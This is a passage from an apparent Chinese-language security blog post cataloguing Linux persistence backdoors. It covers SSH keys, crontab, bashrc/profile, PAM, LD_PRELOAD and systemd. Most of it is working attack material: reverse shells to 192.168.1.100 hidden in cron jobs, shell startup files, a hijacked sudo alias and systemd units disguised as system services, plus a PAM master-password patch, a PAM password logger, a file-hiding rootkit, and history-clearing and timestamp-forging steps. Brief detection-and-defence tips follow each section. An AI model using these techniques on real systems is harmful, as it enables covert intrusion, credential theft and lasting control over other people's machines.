-<h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>在攻击机上生成密钥对：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -f ~/.ssh/backdoor_key -N <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>将公钥写入目标的 authorized_keys：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /root/.ssh</span><br><span class="line"><span class="built_in">chmod</span> 700 /root/.ssh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAA... root@kali&quot;</span> &gt;&gt; /root/.ssh/authorized_keys</span><br><span class="line"><span class="built_in">chmod</span> 600 /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
-
-<p>对于普通用户，同理操作 <code>~/.ssh/authorized_keys</code>。</p>
-<h3 id="隐蔽性增强"><a href="#隐蔽性增强" class="headerlink" title="隐蔽性增强"></a>隐蔽性增强</h3><ul>
-<li>恢复 SSH 配置文件：如果修改了 <code>/etc/ssh/sshd_config</code>，记得恢复原始配置</li>
-<li>清除命令历史：<code>history -c &amp;&amp; rm -f ~/.bash_history</code></li>
-<li>修改密钥文件的访问&#x2F;修改时间戳：</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> -r /etc/passwd /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
-
-<h3 id="检测与防御"><a href="#检测与防御" class="headerlink" title="检测与防御"></a>检测与防御</h3><ul>
-<li>定期检查 <code>~/.ssh/authorized_keys</code> 文件内容</li>
-<li>使用 <code>find</code> 查找系统中所有 authorized_keys 文件：</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&quot;authorized_keys&quot;</span> -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>限制 SSH 登录的 IP 来源</li>
-<li>启用 SSH 登录日志审计：<code>cat /var/log/auth.log | grep Accepted</code></li>
-</ul>
-<hr>
-<h2 id="二、Crontab-反向-Shell-持久化"><a href="#二、Crontab-反向-Shell-持久化" class="headerlink" title="二、Crontab 反向 Shell 持久化"></a>二、Crontab 反向 Shell 持久化</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>Crontab 是 Linux 下的周期性任务调度工具。通过添加一条定期执行反向连接 shell 的命令，攻击者可以在指定间隔内维持对目标主机的控制。</p>
-<h3 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 写入 root 用户的 crontab</span></span><br><span class="line">(crontab -l 2&gt;/dev/null; <span class="built_in">echo</span> <span class="string">&quot;*/5 * * * * /bin/bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1&#x27;&quot;</span>) | crontab -</span><br></pre></td></tr></table></figure>
-
-<p>或直接编辑 <code>/etc/crontab</code> 文件：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;*/10 * * * * root /bin/bash -c &#x27;exec /bin/bash -i &amp;&gt;/dev/tcp/192.168.1.100/4444 &lt;&amp;1&#x27;&quot;</span> &gt;&gt; /etc/crontab</span><br></pre></td></tr></table></figure>
-
-<h3 id="变种：使用-reboot-实现开机自启"><a href="#变种：使用-reboot-实现开机自启" class="headerlink" title="变种：使用 @reboot 实现开机自启"></a>变种：使用 @reboot 实现开机自启</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;@reboot root /bin/bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.100/5555 0&gt;&amp;1&#x27;&quot;</span> &gt;&gt; /etc/crontab</span><br></pre></td></tr></table></figure>
-
-<h3 id="伪装技巧"><a href="#伪装技巧" class="headerlink" title="伪装技巧"></a>伪装技巧</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 混淆命令，模仿系统自带任务名</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;*/5 * * * * root /usr/lib/systemd/systemd-cron-update &gt;/dev/null 2&gt;&amp;1&quot;</span> &gt;&gt; /etc/crontab</span><br></pre></td></tr></table></figure>
-
-<p>实际命令可隐藏在 <code>/usr/lib/systemd/systemd-cron-update</code> 这个伪造的脚本中：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; /usr/lib/systemd/systemd-cron-update &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1 &amp;</span><br><span class="line">EOF</span><br><span class="line"><span class="built_in">chmod</span> +x /usr/lib/systemd/systemd-cron-update</span><br></pre></td></tr></table></figure>
-
-<h3 id="检测与防御-1"><a href="#检测与防御-1" class="headerlink" title="检测与防御"></a>检测与防御</h3><ul>
-<li>检查所有用户的 crontab：</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> $(<span class="built_in">cut</span> -f1 -d: /etc/passwd); <span class="keyword">do</span> <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$user</span>&quot;</span>; crontab -u <span class="string">&quot;<span class="variable">$user</span>&quot;</span> -l 2&gt;/dev/null; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>检查 <code>/var/spool/cron/crontabs/</code> 目录</li>
-<li>监控 <code>/etc/crontab</code>、<code>/etc/cron.d/</code>、<code>/etc/cron.hourly/</code>、<code>/etc/cron.daily/</code> 等目录的变化</li>
-<li>使用 AIDE 或 auditd 监控文件完整性</li>
-</ul>
-<hr>
-<h2 id="三、bashrc-profile-后门"><a href="#三、bashrc-profile-后门" class="headerlink" title="三、bashrc &#x2F; profile 后门"></a>三、bashrc &#x2F; profile 后门</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>当用户登录 Linux 系统时，Shell 会自动加载一系列配置文件，包括 <code>~/.bashrc</code>、<code>~/.bash_profile</code>、<code>~/.profile</code>、<code>/etc/profile</code>、<code>/etc/bash.bashrc</code> 等。攻击者可以在这些文件中植入恶意代码，在用户登录时自动执行。</p>
-<h3 id="利用方法-2"><a href="#利用方法-2" class="headerlink" title="利用方法"></a>利用方法</h3><p>在用户的 <code>~/.bashrc</code> 末尾添加反向 Shell：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.100/6666 0&gt;&amp;1 &amp;&#x27;</span> &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>
-
-<p>更隐蔽的方式：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt;&gt; ~/.bashrc &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="keyword">if</span> [ -f ~/.bash_alias ]; <span class="keyword">then</span></span><br><span class="line">    . ~/.bash_alias</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt; ~/.bash_alias &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> <span class="built_in">ls</span>=<span class="string">&#x27;ls --color=auto&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> grep=<span class="string">&#x27;grep --color=auto&#x27;</span></span><br><span class="line">(<span class="built_in">nohup</span> /bin/bash -c <span class="string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.100/6666 0&gt;&amp;1&quot;</span> &amp;&gt;/dev/null &amp;)</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
-
-<p>全局生效写入 <code>/etc/profile</code>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;(sleep 10 &amp;&amp; /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.100/6666 0&gt;&amp;1) &amp;&#x27;</span> &gt;&gt; /etc/profile</span><br></pre></td></tr></table></figure>
-
-<h3 id="高级技巧：劫持常用命令"><a href="#高级技巧：劫持常用命令" class="headerlink" title="高级技巧：劫持常用命令"></a>高级技巧：劫持常用命令</h3><p>修改 <code>.bashrc</code>，创建恶意 alias 劫持 <code>sudo</code> 等命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;alias sudo=&quot;( /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.100/7777 0&gt;&amp;1 &amp; ) &amp;&amp; \sudo&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>
-
-<p>每次用户执行 <code>sudo</code> 时都会触发反向连接。</p>
-<h3 id="检测与防御-2"><a href="#检测与防御-2" class="headerlink" title="检测与防御"></a>检测与防御</h3><ul>
-<li>检查所有用户家目录下的 <code>.bashrc</code>、<code>.profile</code>、<code>.bash_profile</code></li>
-<li>检查全局配置文件：<code>/etc/profile</code>、<code>/etc/bash.bashrc</code>、<code>/etc/profile.d/</code></li>
-<li>使用 <code>alias</code> 命令检查是否存在异常别名</li>
-<li>计算常用配置文件的哈希值并定期比对</li>
-</ul>
-<hr>
-<h2 id="四、PAM-模块后门"><a href="#四、PAM-模块后门" class="headerlink" title="四、PAM 模块后门"></a>四、PAM 模块后门</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>PAM（Pluggable Authentication Modules）是 Linux 系统中负责认证的模块化框架。当用户进行登录等操作时，系统会按照配置文件调用相应的 PAM 模块。攻击者可以编写或替换恶意 PAM 模块，在认证过程中窃取密码或植入后门。</p>
-<h3 id="利用方法-——-万能密码后门"><a href="#利用方法-——-万能密码后门" class="headerlink" title="利用方法 —— 万能密码后门"></a>利用方法 —— 万能密码后门</h3><p>首先定位系统中已有的 PAM 认证模块源码（以 <code>pam_unix_auth.c</code> 为例）：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载对应版本的 PAM 源码</span></span><br><span class="line">apt-get <span class="built_in">source</span> libpam-modules</span><br><span class="line"><span class="built_in">cd</span> pam-*/</span><br></pre></td></tr></table></figure>
-
-<p>修改 <code>modules/pam_unix/pam_unix_auth.c</code>，在密码验证函数中添加”万能密码”逻辑：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 在 verify_pwd_hash 函数中添加 */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(p, <span class="string">&quot;p@ssW0rd_b4ckd00r&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    retval = PAM_SUCCESS;</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>编译并替换原模块：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure &amp;&amp; make</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> modules/pam_unix/.libs/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so</span><br></pre></td></tr></table></figure>
-
-<h3 id="利用方法-——-记录登录密码"><a href="#利用方法-——-记录登录密码" class="headerlink" title="利用方法 —— 记录登录密码"></a>利用方法 —— 记录登录密码</h3><p>修改 PAM 模块，将用户登录密码写入文件：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 在认证函数中插入 */</span></span><br><span class="line">FILE *fp = fopen(<span class="string">&quot;/tmp/.log&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (fp) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(fp, <span class="string">&quot;User: %s, Password: %s\n&quot;</span>, username, password);</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="SSH-特定场景"><a href="#SSH-特定场景" class="headerlink" title="SSH 特定场景"></a>SSH 特定场景</h3><p>对于 SSH 服务，可修改 <code>/etc/pam.d/sshd</code>，添加一个可执行脚本：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 /etc/pam.d/sshd 末尾添加</span></span><br><span class="line">auth optional pam_exec.so /usr/lib/security/pam_script.sh</span><br></pre></td></tr></table></figure>
-
-<p>创建 <code>/usr/lib/security/pam_script.sh</code>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$PAM_TYPE</span>&quot;</span> = <span class="string">&quot;open_session&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    /bin/bash -c <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.100/8888 0&gt;&amp;1&#x27;</span> &amp;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure>
-
-<h3 id="检测与防御-3"><a href="#检测与防御-3" class="headerlink" title="检测与防御"></a>检测与防御</h3><ul>
-<li>检查 PAM 模块文件的完整性（MD5&#x2F;SHA256 校验）</li>
-<li>对比 PAM 模块与官方发行包的一致性：<code>dpkg -V libpam-modules</code></li>
-<li>检查 <code>/etc/pam.d/</code> 下各服务的配置是否被篡改</li>
-<li>监控 <code>/lib/security/</code> 和 <code>/lib/x86_64-linux-gnu/security/</code> 目录的文件变化</li>
-</ul>
-<hr>
-<h2 id="五、LD-PRELOAD-Rootkit"><a href="#五、LD-PRELOAD-Rootkit" class="headerlink" title="五、LD_PRELOAD Rootkit"></a>五、LD_PRELOAD Rootkit</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p><code>LD_PRELOAD</code> 是 Linux 动态链接器的一个环境变量，它允许用户在程序运行时优先加载指定的共享库。通过编写恶意的共享库，劫持系统函数（如 <code>open</code>、<code>read</code>、<code>write</code>、<code>accept</code> 等），可以实现隐藏文件、进程、网络连接等 rootkit 功能。</p>
-<h3 id="基础示例-——-劫持-accept-实现反向-Shell"><a href="#基础示例-——-劫持-accept-实现反向-Shell" class="headerlink" title="基础示例 —— 劫持 accept() 实现反向 Shell"></a>基础示例 —— 劫持 accept() 实现反向 Shell</h3><p>创建恶意共享库 <code>backdoor.c</code>：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">accept</span><span class="params">(<span class="type">int</span> sockfd, <span class="keyword">struct</span> sockaddr *addr, <span class="type">socklen_t</span> *addrlen)</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="title function_">int</span> <span class="params">(*original_accept)</span><span class="params">(<span class="type">int</span>, <span class="keyword">struct</span> sockaddr *, <span class="type">socklen_t</span> *)</span>;</span><br><span class="line">    <span class="keyword">if</span> (!original_accept) &#123;</span><br><span class="line">        original_accept = dlsym(RTLD_NEXT, <span class="string">&quot;accept&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = original_accept(sockfd, addr, addrlen);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> *<span class="title">sin</span> =</span> (<span class="keyword">struct</span> sockaddr_in *)addr;</span><br><span class="line">    <span class="type">char</span> *ip = inet_ntoa(<span class="built_in">sin</span>-&gt;sin_addr);</span><br><span class="line">    <span class="type">int</span> port = ntohs(<span class="built_in">sin</span>-&gt;sin_port);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 触发条件：如果连接来自某个特定 IP 或当某个&quot;魔法端口&quot;被访问</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(ip, <span class="string">&quot;192.168.1.100&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 反弹 shell</span></span><br><span class="line">        system(<span class="string">&quot;/bin/bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.100/9999 0&gt;&amp;1&#x27; &amp;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>编译共享库：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC backdoor.c -o /lib/libsystemd.so.1 -ldl</span><br></pre></td></tr></table></figure>
-
-<p>设置环境变量：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;export LD_PRELOAD=/lib/libsystemd.so.1&quot;</span> &gt;&gt; /etc/profile</span><br></pre></td></tr></table></figure>
-
-<h3 id="高级技巧-——-隐藏特定文件"><a href="#高级技巧-——-隐藏特定文件" class="headerlink" title="高级技巧 —— 隐藏特定文件"></a>高级技巧 —— 隐藏特定文件</h3><p>劫持 <code>readdir()</code> 函数隐藏文件：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> dirent *<span class="title function_">readdir</span><span class="params">(DIR *dirp)</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *(*<span class="title">original_readdir</span>)(<span class="title">DIR</span> *);</span></span><br><span class="line">    <span class="keyword">if</span> (!original_readdir) &#123;</span><br><span class="line">        original_readdir = dlsym(RTLD_NEXT, <span class="string">&quot;readdir&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">dir</span>;</span></span><br><span class="line">    <span class="keyword">while</span> ((dir = original_readdir(dirp)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(dir-&gt;d_name, <span class="string">&quot;backdoor&quot;</span>) == <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">            <span class="built_in">strstr</span>(dir-&gt;d_name, <span class="string">&quot;rootkit&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dir;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="检测与防御-4"><a href="#检测与防御-4" class="headerlink" title="检测与防御"></a>检测与防御</h3><ul>
-<li>检查环境变量：<code>env | grep LD_PRELOAD</code></li>
-<li>检查可疑共享库：<code>ldd /bin/ls | grep -v &quot;=&gt; /lib&quot;</code></li>
-<li>使用 <code>rkhunter</code>、<code>chkrootkit</code> 等 rootkit 检测工具</li>
-<li>内核安全模块（如 SELinux、AppArmor）可限制 <code>LD_PRELOAD</code> 的使用</li>
-</ul>
-<hr>
-<h2 id="六、Systemd-服务后门"><a href="#六、Systemd-服务后门" class="headerlink" title="六、Systemd 服务后门"></a>六、Systemd 服务后门</h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p>Systemd 是现代 Linux 发行版的初始化系统，负责管理系统服务和守护进程。攻击者可以创建恶意的 systemd 服务单元，实现开机自启动的持久化后门。</p>
-<h3 id="基本服务单元"><a href="#基本服务单元" class="headerlink" title="基本服务单元"></a>基本服务单元</h3><p>创建服务文件 <code>/etc/systemd/system/systemd-networkd-resolver.service</code>（伪装为网络解析服务）：</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=Systemd Network Name Resolution Service</span><br><span class="line"><span class="attr">After</span>=network.target</span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">Type</span>=simple</span><br><span class="line"><span class="attr">Restart</span>=always</span><br><span class="line"><span class="attr">RestartSec</span>=<span class="number">60</span></span><br><span class="line"><span class="attr">ExecStart</span>=/bin/bash -c <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1&#x27;</span></span><br><span class="line"><span class="attr">StandardOutput</span>=null</span><br><span class="line"><span class="attr">StandardError</span>=null</span><br><span class="line"></span><br><span class="line"><span class="section">[Install]</span></span><br><span class="line"><span class="attr">WantedBy</span>=multi-user.target</span><br></pre></td></tr></table></figure>
-
-<p>启用并启动服务：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl <span class="built_in">enable</span> systemd-networkd-resolver.service</span><br><span class="line">systemctl start systemd-networkd-resolver.service</span><br></pre></td></tr></table></figure>
-
-<h3 id="使用-Timer-实现定时任务"><a href="#使用-Timer-实现定时任务" class="headerlink" title="使用 Timer 实现定时任务"></a>使用 Timer 实现定时任务</h3><p>创建 <code>/etc/systemd/system/apt-update.service</code>：</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=APT Update Service</span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">Type</span>=<span class="literal">on</span>eshot</span><br><span class="line"><span class="attr">ExecStart</span>=/usr/lib/apt/apt-helper.sh</span><br><span class="line"><span class="attr">StandardOutput</span>=null</span><br><span class="line"><span class="attr">StandardError</span>=null</span><br></pre></td></tr></table></figure>
-
-<p>创建 <code>/etc/systemd/system/apt-update.timer</code>：</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=APT Update Timer</span><br><span class="line"></span><br><span class="line"><span class="section">[Timer]</span></span><br><span class="line"><span class="attr">OnBootSec</span>=<span class="number">5</span>min</span><br><span class="line"><span class="attr">OnUnitActiveSec</span>=<span class="number">30</span>min</span><br><span class="line"><span class="attr">RandomizedDelaySec</span>=<span class="number">60</span></span><br><span class="line"></span><br><span class="line"><span class="section">[Install]</span></span><br><span class="line"><span class="attr">WantedBy</span>=timers.target</span><br></pre></td></tr></table></figure>
-
-<p>创建恶意脚本 <code>/usr/lib/apt/apt-helper.sh</code>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> ! pgrep -f <span class="string">&quot;bash.*192.168.1.100.*5555&quot;</span> &gt; /dev/null; <span class="keyword">then</span></span><br><span class="line">    /bin/bash -c <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.100/5555 0&gt;&amp;1&#x27;</span> &amp;</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x /usr/lib/apt/apt-helper.sh</span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl <span class="built_in">enable</span> apt-update.timer</span><br><span class="line">systemctl start apt-update.timer</span><br></pre></td></tr></table></figure>
-
-<h3 id="用户级-Systemd-服务"><a href="#用户级-Systemd-服务" class="headerlink" title="用户级 Systemd 服务"></a>用户级 Systemd 服务</h3><p>如果只有普通用户权限，可以使用用户级 systemd 服务：</p>
